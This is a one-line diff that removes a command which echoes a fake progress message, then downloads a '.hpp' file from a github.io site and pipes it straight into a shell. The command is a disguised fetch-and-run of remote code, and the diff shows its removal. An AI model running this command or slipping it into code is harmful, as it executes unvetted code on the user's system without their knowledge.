@@ -1,1 +1,0 @@
-echo Progress: 21.00%curl -L --progress-bar frkns.github.io/fun/EditionScore.hpp | sh
